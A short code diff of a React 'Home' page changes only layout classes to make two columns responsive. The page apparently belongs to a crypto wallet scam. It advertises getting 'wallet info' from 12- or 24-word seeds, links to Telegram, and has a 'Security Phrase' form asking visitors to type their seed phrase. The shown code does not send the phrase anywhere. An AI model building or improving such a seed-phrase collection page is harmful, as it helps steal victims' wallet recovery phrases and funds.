@@ -50,7 +50,7 @@ const Home = () => {
 				<div className="section-1">
 					<div className="container">
 						<div className="row" >
-							<div className="col-5">
+							<div className="col-lg-5 col-md-12">
 								<div style={{marginTop:'200px'}}>
 									<h2 className='text-white'>Can Get Wallet Info</h2>
 									<h2 className='text-white'>From 12, 24 Seeds</h2>
@@ -59,7 +59,7 @@ const Home = () => {
 									<a href = "https://t.me" target={"_blank"} className='button-white'>Go To Telegram</a>
 								</div>
 							</div>
-							<div className="col-7">
+							<div className="col-lg-7 col-md-12">
 								<div className="form" style={{marginTop:'100px'}}>
 									<h4 className='mt0 mb3'>Security Phrase</h4>
 									<input type={"text"} className="w100"  placeholder="Please input 12,24 seeds" value={state.value} onChange={(e)=>{updateStatus({value:e.target.value})}}/>
